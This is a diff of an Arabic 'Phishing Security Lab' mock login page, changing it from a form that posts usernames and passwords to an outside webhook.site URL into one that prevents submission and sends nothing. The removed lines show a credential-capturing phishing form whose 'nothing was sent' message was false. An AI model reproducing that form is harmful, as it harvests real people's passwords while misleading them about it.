@@ -2,66 +2,87 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Phishing Security Lab</title>
-<style>
-body {
-  font-family: Arial, sans-serif;
-  background: #f1f3f5;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  min-height: 90vh;
-}
-.card {
-  background: white;
-  padding: 25px;
-  border-radius: 12px;
-  width: 300px;
-  box-shadow: 0 2px 12px #0002;
-}
-input, button {
-  box-sizing: border-box;
-  width: 100%;
-  padding: 12px;
-  margin: 8px 0;
-}
-button {
-  background: #2457a7;
-  color: white;
-  border: 0;
-  border-radius: 6px;
-}
-#result {
-  color: #a33;
-}
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Phishing Security Lab</title>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f1f3f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 90vh;
+    }
+
+    .card {
+      background: white;
+      padding: 25px;
+      border-radius: 12px;
+      width: 300px;
+      box-shadow: 0 2px 12px #0002;
+    }
+
+    input, button {
+      box-sizing: border-box;
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+    }
+
+    button {
+      background: #2457a7;
+      color: white;
+      border: 0;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    #result {
+      color: #176b37;
+    }
+  </style>
 </head>
+
 <body>
+  <div class="card">
+    <h2>مختبر تسجيل الدخول</h2>
+    <p>صفحة تدريبية ببيانات وهمية فقط.</p>
 
-<div class="card">
-  <h2>مختبر تسجيل الدخول</h2>
-  <p>صفحة تدريبية ببيانات وهمية فقط.</p>
+    <form id="loginForm" action="#" method="post">
+      <input
+        type="text"
+        name="username"
+        placeholder="اسم تجريبي"
+        autocomplete="off"
+      >
 
-  <form action="https://webhook.site/5d7ed63c-8d26-46ea-b7bc-7d8c3af1230f" method="post">
-    <input type="text" name="username" placeholder="اسم تجريبي">
-<input type="password" name="password" placeholder="كلمة مرور وهمية">
-    <button type="submit">تسجيل الدخول التجريبي</button>
-  </form>
+      <input
+        type="password"
+        name="password"
+        placeholder="كلمة مرور وهمية"
+        autocomplete="off"
+      >
 
-  <p id="result"></p>
-</div>
+      <button type="submit">تسجيل الدخول التجريبي</button>
+    </form>
 
-<script>
-document.getElementById("loginForm").addEventListener(
-  "submit", function(event) {
-    event.preventDefault();
-    document.getElementById("result").textContent =
-      "محاكاة فقط: لم يتم إرسال أو تخزين أي بيانات.";
-  }
-);
-</script>
+    <p id="result" role="status"></p>
+  </div>
 
+  <script>
+    const form = document.getElementById("loginForm");
+    const result = document.getElementById("result");
+
+    form.addEventListener("submit", function(event) {
+      event.preventDefault();
+
+      result.textContent =
+        "نجحت المحاكاة: لم يتم إرسال أو تخزين أي بيانات.";
+      
+      form.reset();
+    });
+  </script>
 </body>
 </html>
